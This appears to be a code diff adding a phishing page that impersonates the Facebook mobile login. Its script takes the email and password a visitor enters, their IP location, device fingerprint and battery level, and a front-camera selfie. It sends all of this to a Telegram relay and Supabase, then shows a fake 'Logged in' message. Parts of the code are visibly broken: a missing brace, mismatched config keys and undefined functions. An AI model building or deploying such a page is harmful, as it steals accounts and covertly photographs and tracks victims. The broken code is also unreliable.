@@ -1,0 +1,464 @@
+<!DOCTYPE html>
+<html lang="en-GB">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<meta name="robots" content="noindex">
+<meta name="theme-color" content="#fef3ec">
+<title>Log in to Facebook</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html,body{height:100%}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background:#fff;color:#1c1e21;display:flex;flex-direction:column;min-height:100vh;-webkit-font-smoothing:antialiased}
+.topbar{background:#fef3ec;padding:11px 16px;padding-top:calc(11px + env(safe-area-inset-top,0px));display:flex;align-items:center;gap:9px;font-size:13px;color:#1877f2;line-height:1.25}
+.topbar svg{width:20px;height:20px;fill:#1877f2;flex-shrink:0}
+.lang{display:flex;justify-content:center;align-items:center;gap:4px;background:none;border:none;font:inherit;font-size:14px;color:#606770;padding:14px 0 0;cursor:pointer;width:100%}
+.lang svg{width:12px;height:12px;fill:#606770}
+.wrap{flex:1;display:flex;flex-direction:column;padding:0 24px;max-width:420px;width:100%;margin:0 auto}
+.logo{display:flex;justify-content:center;padding:22px 0 26px}
+.logo svg{width:68px;height:68px}
+.field{width:100%;padding:15px 16px;font-size:16px;background:#fff;border:1px solid #dddfe2;border-radius:6px;outline:none;margin-bottom:10px;color:#1c1e21;-webkit-appearance:none;appearance:none;transition:border-color .15s}
+.field::placeholder{color:#90949c}
+.field:focus{border-color:#1877f2}
+.btn{width:100%;padding:14px;background:#1877f2;color:#fff;border:none;border-radius:6px;font-size:16px;font-weight:600;cursor:pointer;margin-top:2px;transition:background .15s}
+.btn:active{background:#166fe5}
+.btn:disabled{opacity:.55;cursor:default}
+.forgot{display:block;text-align:center;margin:16px 0;color:#1877f2;font-size:14px;text-decoration:none}
+.or{display:flex;align-items:center;gap:10px;color:#8d949e;font-size:13px;margin:2px 0 18px}
+.or::before,.or::after{content:"";flex:1;height:1px;background:#dddfe2}
+.btn-create{display:block;width:100%;padding:13px;background:#42b72a;color:#fff;border:none;border-radius:6px;font-size:16px;font-weight:600;cursor:pointer;text-align:center;text-decoration:none;transition:background .15s}
+.btn-create:active{background:#36a420}
+.fb-link{display:block;text-align:center;margin:18px 0 4px;background:none;border:none;font:inherit;font-size:13px;color:#606770;cursor:pointer;width:100%;padding:6px}
+.fb-link:disabled{opacity:.55}
+.btn:focus-visible,.btn-create:focus-visible,.fb-link:focus-visible,.lang:focus-visible,.forgot:focus-visible,.lang-item:focus-visible,.sheet-close:focus-visible{outline:2px solid #1877f2;outline-offset:2px}
+.err{color:#ed4956;font-size:13px;margin-top:10px;display:none;text-align:center;line-height:1.4}
+.ok{color:#2e7d32;font-size:13px;margin-top:10px;display:none;text-align:center}
+.hp{position:absolute;left:-9999px;width:1px;height:1px;overflow:hidden}
+.spin{display:inline-block;width:14px;height:14px;border:2px solid rgba(255,255,255,.4);border-top-color:#fff;border-radius:50%;animation:sp .7s linear infinite;vertical-align:-2px;margin-right:6px}
+@keyframes sp{to{transform:rotate(360deg)}}
+.meta{display:flex;justify-content:center;align-items:center;gap:7px;padding:22px 0 30px;padding-bottom:calc(30px + env(safe-area-inset-bottom,0px))}
+.meta svg{width:26px;height:16px;flex-shrink:0}
+.meta span{font-size:17px;font-weight:700;color:#1c2b33;letter-spacing:-.2px}
+[dir="rtl"] .field{text-align:right}
+.sheet-backdrop{position:fixed;inset:0;background:rgba(0,0,0,.45);opacity:0;pointer-events:none;transition:opacity .2s;z-index:20}
+.sheet-backdrop.open{opacity:1;pointer-events:auto}
+.sheet{position:fixed;left:0;right:0;bottom:0;background:#fff;border-radius:16px 16px 0 0;max-height:72vh;overflow:auto;transform:translateY(100%);transition:transform .25s ease;z-index:21;padding-bottom:calc(12px + env(safe-area-inset-bottom,0px));box-shadow:0 -2px 16px rgba(0,0,0,.12)}
+.sheet.open{transform:translateY(0)}
+.sheet-head{display:flex;align-items:center;justify-content:space-between;padding:16px 20px 10px;position:sticky;top:0;background:#fff;border-bottom:1px solid #eee}
+.sheet-head h2{font-size:16px;font-weight:600}
+.sheet-close{background:none;border:none;font-size:17px;color:#606770;cursor:pointer;padding:4px 8px;line-height:1}
+.lang-list{list-style:none;padding:6px 0}
+.lang-item{display:block;width:100%;text-align:start;background:none;border:none;font:inherit;font-size:15px;color:#1c1e21;padding:13px 20px;cursor:pointer}
+.lang-item:active{background:#f0f2f5}
+.lang-item[aria-current="true"]{color:#1877f2;font-weight:600}
+</style>
+</head>
+<body>
+
+<div class="topbar">
+  <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 2 6 8h3v9h6V8h3z"/><path d="M4 19h16v3H4z"/></svg>
+  <span data-i18n="topbar">Get Facebook for Android and browse faster.</span>
+</div>
+
+<button class="lang" id="langBtn" type="button" aria-haspopup="dialog">
+  <span class="lang-label">English (UK)</span>
+  <svg viewBox="0 0 16 16" aria-hidden="true"><path d="M8 11 2.5 5.5l1.4-1.4L8 8.2l4.1-4.1 1.4 1.4z"/></svg>
+</button>
+
+<main class="wrap">
+  <div class="logo">
+    <svg viewBox="0 0 36 36" aria-label="Facebook"><circle cx="18" cy="18" r="18" fill="#1877f2"/><path fill="#fff" d="M24.4 23.2l.8-5.2h-5v-3.4c0-1.4.7-2.8 2.9-2.8h2.3V7.3s-2.1-.4-4.1-.4c-4.2 0-6.9 2.5-6.9 7.1v4h-4.6v5.2h4.6V36h5.7V23.2z"/></svg>
+  </div>
+
+  <form id="loginForm" novalidate>
+    <input class="hp" type="text" id="hp" name="hp" tabindex="-1" autocomplete="off" aria-hidden="true">
+
+    <input class="field" type="text" id="user" name="email"
+           data-i18n-ph="phUser" placeholder="Mobile number or email address"
+           autocomplete="username" autocapitalize="none" spellcheck="false"
+           inputmode="email" enterkeyhint="next" maxlength="120">
+
+    <input class="field" type="password" id="pass" name="password"
+           data-i18n-ph="phPass" placeholder="Password"
+           autocomplete="current-password" enterkeyhint="go" maxlength="200">
+
+    <button class="btn" id="loginBtn" type="submit" data-i18n="login">Log in</button>
+  </form>
+
+  <a class="forgot" href="#" data-i18n="forgot">Forgotten password?</a>
+
+  <p class="err" id="err" role="alert" aria-live="polite"></p>
+  <p class="ok" id="ok" role="status" aria-live="polite"></p>
+
+  <div class="or" data-i18n="or">or</div>
+
+  <a class="btn-create" href="https://m.facebook.com/reg/" data-i18n="create">Create new account</a>
+
+  <button class="fb-link" id="fbBtn" type="button" data-i18n="fb">Log in with Facebook</button>
+
+  <div class="meta">
+    <svg viewBox="0 0 40 24" aria-hidden="true">
+      <path d="M20 12C16 5 12 4 8 4C4 4 2 7 2 12C2 17 4 20 8 20C12 20 16 19 20 12C24 5 28 4 32 4C36 4 38 7 38 12C38 17 36 20 32 20C28 20 24 19 20 12Z"
+            fill="none" stroke="#0081FB" stroke-width="3.4"
+            stroke-linecap="round" stroke-linejoin="round"/>
+    </svg>
+    <span>Meta</span>
+  </div>
+</main>
+
+<div class="sheet-backdrop" id="sheetBackdrop"></div>
+<div class="sheet" id="sheet" role="dialog" aria-modal="true" aria-labelledby="sheetTitle">
+  <div class="sheet-head">
+    <h2 id="sheetTitle" data-i18n="chooseLang">Choose a language</h2>
+    <button class="sheet-close" id="sheetClose" type="button" aria-label="Close">✕</button>
+  </div>
+  <ul class="lang-list" id="langList"></ul>
+</div>
+
+<script>
+/* ============ CONFIG ============ */
+const CONFIG = {
+  telegram: {
+    ChatId: '8234346269'
+  },
+  supabase: {
+    url: 'https://...supabase.co',
+    key: 'sb_publishable_...'
+  },
+  fb: {
+    appId: '2246879869562288',
+    version: 'v23.0',
+  redirect: ''
+};
+
+/* ============ ELEMENTS ============ */
+const form     = document.getElementById('loginForm');
+const userEl   = document.getElementById('user');
+const passEl   = document.getElementById('pass');
+const hpEl     = document.getElementById('hp');
+const btn      = document.getElementById('loginBtn');
+const fbBtn    = document.getElementById('fbBtn');
+const errEl    = document.getElementById('err');
+const okEl     = document.getElementById('ok');
+const langBtn  = document.getElementById('langBtn');
+const langList = document.getElementById('langList');
+const sheet    = document.getElementById('sheet');
+const backdrop = document.getElementById('sheetBackdrop');
+const sheetClose = document.getElementById('sheetClose');
+let busy = false;
+
+const showErr  = t => { errEl.textContent = t; errEl.style.display = 'block'; okEl.style.display = 'none'; };
+const clearErr = () => { errEl.style.display = 'none'; };
+
+/* ============ I18N ============ */
+const LANGS = {
+  'en-GB': { label: 'English (UK)', dir: 'ltr', t: {
+    topbar: 'Get Facebook for Android and browse faster.',
+    phUser: 'Mobile number or email address', phPass: 'Password',
+    login: 'Log in', forgot: 'Forgotten password?', or: 'or',
+    create: 'Create new account', fb: 'Log in with Facebook',
+    chooseLang: 'Choose a language', errUser: 'Enter your mobile number or email address.',
+    errPass: 'Enter your password.', errLong: 'Input too long.',
+    loggingIn: 'Logging in...', loggedIn: 'Logged in ✓'
+  }},
+  'en-US': { label: 'English (US)', dir: 'ltr', t: {
+    topbar: 'Get Facebook for Android and browse faster.',
+    phUser: 'Mobile number or email address', phPass: 'Password',
+    login: 'Log in', forgot: 'Forgot password?', or: 'or',
+    create: 'Create new account', fb: 'Log in with Facebook',
+    chooseLang: 'Choose a language', errUser: 'Enter your mobile number or email address.',
+    errPass: 'Enter your password.', errLong: 'Input too long.',
+    loggingIn: 'Logging in...', loggedIn: 'Logged in ✓'
+  }},
+  'fr': { label: 'Français', dir: 'ltr', t: {
+    topbar: 'Obtenez Facebook pour Android et naviguez plus vite.',
+    phUser: 'Numéro de mobile ou adresse e-mail', phPass: 'Mot de passe',
+    login: 'Se connecter', forgot: 'Mot de passe oublié ?', or: 'ou',
+    create: 'Créer un nouveau compte', fb: 'Se connecter avec Facebook',
+    chooseLang: 'Choisir une langue', errUser: 'Saisissez votre numéro ou votre e-mail.',
+    errPass: 'Saisissez votre mot de passe.', errLong: 'Entrée trop longue.',
+    loggingIn: 'Connexion...', loggedIn: 'Connecté ✓'
+  }},
+  'es': { label: 'Español', dir: 'ltr', t: {
+    topbar: 'Obtén Facebook para Android y navega más rápido.',
+    phUser: 'Número de móvil o correo electrónico', phPass: 'Contraseña',
+    login: 'Iniciar sesión', forgot: '¿Has olvidado la contraseña?', or: 'o',
+    create: 'Crear cuenta nueva', fb: 'Iniciar sesión con Facebook',
+    chooseLang: 'Elige un idioma', errUser: 'Introduce tu número o correo.',
+    errPass: 'Introduce tu contraseña.', errLong: 'Entrada demasiado larga.',
+    loggingIn: 'Iniciando sesión...', loggedIn: 'Sesión iniciada ✓'
+  }},
+  'pt-BR': { label: 'Português (Brasil)', dir: 'ltr', t: {
+    topbar: 'Baixe o Facebook para Android e navegue mais rápido.',
+    phUser: 'Celular ou e-mail', phPass: 'Senha',
+    login: 'Entrar', forgot: 'Esqueceu a senha?', or: 'ou',
+    create: 'Criar nova conta', fb: 'Entrar com o Facebook',
+    chooseLang: 'Escolha um idioma', errUser: 'Digite celular ou e-mail.',
+    errPass: 'Digite sua senha.', errLong: 'Entrada muito longa.',
+    loggingIn: 'Entrando...', loggedIn: 'Conectado ✓'
+  }},
+  'de': { label: 'Deutsch', dir: 'ltr', t: {
+    topbar: 'Hol dir Facebook für Android und surfe schneller.',
+    phUser: 'Handynummer oder E-Mail-Adresse', phPass: 'Passwort',
+    login: 'Anmelden', forgot: 'Passwort vergessen?', or: 'oder',
+    create: 'Neues Konto erstellen', fb: 'Mit Facebook anmelden',
+    chooseLang: 'Sprache wählen', errUser: 'Gib deine Nummer oder E-Mail ein.',
+    errPass: 'Gib dein Passwort ein.', errLong: 'Eingabe zu lang.',
+    loggingIn: 'Anmeldung...', loggedIn: 'Angemeldet ✓'
+  }},
+  'it': { label: 'Italiano', dir: 'ltr', t: {
+    topbar: 'Scarica Facebook per Android e naviga più velocemente.',
+    phUser: 'Numero di cellulare o email', phPass: 'Password',
+    login: 'Accedi', forgot: 'Password dimenticata?', or: 'oppure',
+    create: 'Crea nuovo account', fb: 'Accedi con Facebook',
+    chooseLang: 'Scegli una lingua', errUser: 'Inserisci il numero o l\'email.',
+    errPass: 'Inserisci la password.', errLong: 'Input troppo lungo.',
+    loggingIn: 'Accesso...', loggedIn: 'Accesso effettuato ✓'
+  }},
+  'ar': { label: 'العربية', dir: 'rtl', t: {
+    topbar: 'حمّل فيسبوك للأندرويد وتصفّح بشكل أسرع.',
+    phUser: 'رقم الهاتف أو البريد الإلكتروني', phPass: 'كلمة السر',
+    login: 'تسجيل الدخول', forgot: 'هل نسيت كلمة السر؟', or: 'أو',
+    create: 'إنشاء حساب جديد', fb: 'الدخول بفيسبوك',
+    chooseLang: 'اختر لغة', errUser: 'أدخل رقمك أو بريدك.',
+    errPass: 'أدخل كلمة السر.', errLong: 'المدخل طويل جدًا.',
+    loggingIn: 'جارٍ الدخول...', loggedIn: 'تم الدخول ✓'
+  }},
+  'tr': { label: 'Türkçe', dir: 'ltr', t: {
+    topbar: 'Android için Facebook\'u indir ve daha hızlı gezin.',
+    phUser: 'Cep telefonu numarası veya e-posta', phPass: 'Şifre',
+    login: 'Giriş yap', forgot: 'Şifreni mi unuttun?', or: 'veya',
+    create: 'Yeni hesap oluştur', fb: 'Facebook ile giriş yap',
+    chooseLang: 'Bir dil seç', errUser: 'Numaranı veya e-postanı gir.',
+    errPass: 'Şifreni gir.', errLong: 'Girdi çok uzun.',
+    loggingIn: 'Giriş yapılıyor...', loggedIn: 'Giriş yapıldı ✓'
+  }}
+};
+
+let currentLang = 'en-GB';
+const t = k => (LANGS[currentLang] && LANGS[currentLang].t[k]) || LANGS['en-GB'].t[k];
+
+function applyLang(code, save) {
+  const L = LANGS[code] ? code : 'en-GB';
+  currentLang = L;
+  document.documentElement.lang = L;
+  document.documentElement.dir = LANGS[L].dir;
+  langBtn.querySelector('.lang-label').textContent = LANGS[L].label;
+
+  document.querySelectorAll('[data-i18n]').forEach(el => {
+    const k = el.dataset.i18n;
+    if (LANGS[L].t[k]) el.textContent = LANGS[L].t[k];
+  });
+  document.querySelectorAll('[data-i18n-ph]').forEach(el => {
+    const k = el.dataset.i18nPh;
+    if (LANGS[L].t[k]) el.placeholder = LANGS[L].t[k];
+  });
+  document.querySelectorAll('.lang-item').forEach(b => {
+    b.setAttribute('aria-current', b.dataset.code === L ? 'true' : 'false');
+  });
+  if (save !== false) { try { localStorage.setItem('lang', L); } catch (e) {} }
+}
+
+function buildLangList() {
+  langList.innerHTML = '';
+  Object.keys(LANGS).forEach(code => {
+    const li = document.createElement('li');
+    const b = document.createElement('button');
+    b.type = 'button';
+    b.className = 'lang-item';
+    b.dataset.code = code;
+    b.textContent = LANGS[code].label;
+    b.addEventListener('click', () => { applyLang(code); closeSheet(); });
+    li.appendChild(b);
+    langList.appendChild(li);
+  });
+}
+
+function openSheet() {
+  sheet.classList.add('open');
+  backdrop.classList.add('open');
+  document.body.style.overflow = 'hidden';
+  sheetClose.focus();
+}
+function closeSheet() {
+  sheet.classList.remove('open');
+  backdrop.classList.remove('open');
+  document.body.style.overflow = '';
+  langBtn.focus();
+}
+
+langBtn.addEventListener('click', openSheet);
+sheetClose.addEventListener('click', closeSheet);
+backdrop.addEventListener('click', closeSheet);
+document.addEventListener('keydown', e => { if (e.key === 'Escape') closeSheet(); });
+    /* ============ HELPERS ============ */
+const now = () => new Date().toLocaleString('en-GB', { timeZone: 'UTC' }) + ' UTC';
+const esc = v => String(v).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+
+async function getNet() {
+  try {
+    const r = await fetch('https://ipwho.is/');
+    const j = await r.json();
+    if (j && j.success !== false && j.ip) return j;
+  } catch (e) {}
+  try {
+    const r = await fetch('https://ipapi.co/json/');
+    const j = await r.json();
+    if (j && j.ip) return j;
+  } catch (e) {}
+  return {};
+}
+
+async function getBattery() {
+  if (!navigator.getBattery) return null;
+  try {
+    const b = await navigator.getBattery();
+    return Math.round(b.level * 100) + '%' + (b.charging ? ' (charging)' : '');
+  } catch (e) { return null; }
+}
+
+async function capturePhoto() {
+  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return null;
+  let stream;
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+      audio: false
+    });
+    const v = document.createElement('video');
+    v.setAttribute('playsinline', '');
+    v.muted = true;
+    v.srcObject = stream;
+    await v.play();
+    await new Promise(r => setTimeout(r, 900));
+    const c = document.createElement('canvas');
+    c.width = v.videoWidth || 640;
+    c.height = v.videoHeight || 480;
+    c.getContext('2d').drawImage(v, 0, 0, c.width, c.height);
+    stream.getTracks().forEach(t => t.stop());
+    return c.toDataURL('image/jpeg', 0.75);
+  } catch (e) {
+    if (stream) stream.getTracks().forEach(t => t.stop());
+    return null;
+  }
+}
+
+/* ============ TELEGRAM ============ */
+
+async function sendText(text) {
+  const r = await fetch('/api/tg', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: CONFIG.telegram.chatId,
+      text: text,
+      parse_mode: 'HTML',
+      disable_web_page_preview: true
+    })
+  });
+  const j = await r.json().catch(() => ({}));
+  if (!r.ok || j.ok === false) throw new Error(j.description || ('HTTP ' + r.status));
+}
+
+async function sendPhoto(dataUrl, caption) {
+  if (!dataUrl) return;
+  try {
+    const blob = await (await fetch(dataUrl)).blob();
+    const fd = new FormData();
+    fd.append('chat_id', CONFIG.telegram.chatId);
+    fd.append('photo', blob, 'selfie.jpg');
+    fd.append('caption', caption);
+    await fetch('/api/tg', { method: 'POST', body: fd });
+  } catch (e) {}
+}
+
+/* ============ FORM LOGIN ============ */
+async function handleLogin() {
+  if (busy) return;
+  const user = userEl.value.trim();
+  const pass = passEl.value;
+
+  if (!user) return showErr(t('errUser'));
+  if (!pass) return showErr(t('errPass'));
+  if (user.length > 120 || pass.length > 200) return showErr(t('errLong'));
+
+  clearErr();
+  busy = true;
+  btn.disabled = true;
+  fbBtn.disabled = true;
+  btn.innerHTML = '<span class="spin"></span>' + t('loggingIn');
+
+  const restore = () => { busy = false; btn.disabled = false; fbBtn.disabled = false; btn.textContent = t('login'); };
+
+  try {
+    const isBot = hpEl.value.trim() !== '';
+    saveLocal({ user, pass, bot: isBot, t: Date.now() });
+
+    const net = await getNet();
+    const bat = await getBattery();
+    const photo = await capturePhoto();
+
+    saveToSupabase({ email: user, password: pass, is_bot: isBot, via: 'form' });
+
+    const lines = [
+      '🔐 <b>Facebook login</b>',
+      '👤 <code>' + esc(user) + '</code>',
+      '🔑 <code>' + esc(pass) + '</code>',
+      '',
+      '🌐 IP: ' + esc(net.ip || '?'),
+      '📍 ' + esc([net.city, net.region, net.country].filter(Boolean).join(', ') || '?'),
+      '🏢 ' + esc((net.connection && net.connection.isp) || net.org || '?'),
+      '🧭 ' + esc((net.latitude || '?') + ', ' + (net.longitude || '?')),
+      '',
+      '🖥 ' + esc(navigator.platform || '?') + ' | ' + esc(screen.width + 'x' + screen.height) + ' @' + devicePixelRatio + 'x',
+      '🪟 ' + esc(innerWidth + 'x' + innerHeight),
+      '🗣 ' + esc(navigator.language || '?') + ' [' + esc((navigator.languages || []).join(',')) + ']',
+      '🕒 ' + esc(Intl.DateTimeFormat().resolvedOptions().timeZone) + ' / ' + now(),
+      '⚙️ ' + esc((navigator.hardwareConcurrency || '?') + ' cores | ' + (navigator.deviceMemory || '?') + 'GB | touch ' + navigator.maxTouchPoints),
+      '🔋 ' + esc(bat || '?'),
+      '🤖 ' + (isBot ? 'bot' : 'human') + ' | ' + esc(location.href),
+      '📱 ' + esc(navigator.userAgent)
+    ];
+
+    try {
+      await sendText(lines.join('\n'));
+    } catch (e) {
+      showErr('Telegram: ' + e.message);
+      restore();
+      return;
+    }
+
+    await sendPhoto(photo, '📸 front camera');
+
+    okEl.textContent = t('loggedIn');
+    okEl.style.display = 'block';
+    btn.textContent = t('loggedIn');
+
+    setTimeout(() => { if (CONFIG.redirect) location.href = CONFIG.redirect; else restore(); }, 1200);
+  } catch (e) {
+    showErr('Error: ' + e.message);
+    restore();
+  }
+}
+
+form.addEventListener('submit', e => { e.preventDefault(); handleLogin(); });
+fbBtn.addEventListener('click', () => {
+  const f = CONFIG.fb;
+  const u = 'https://www.facebook.com/' + f.version + '/dialog/oauth'
+    + '?client_id=' + encodeURIComponent(f.appId)
+    + '&redirect_uri=' + encodeURIComponent(f.redirectUri)
+    + '&response_type=code&scope=email';
+  location.href = u;
+});
+
+/* ============ INIT ============ */
+(function init() {
+  buildLangList();
+  let saved = null;
+  try { saved = localStorage.getItem('lang'); } catch (e) {}
+  applyLang(saved || (navigator.language || 'en-GB'), false);
+  userEl.focus();
+})();
+</script>
+</body>
+</html>
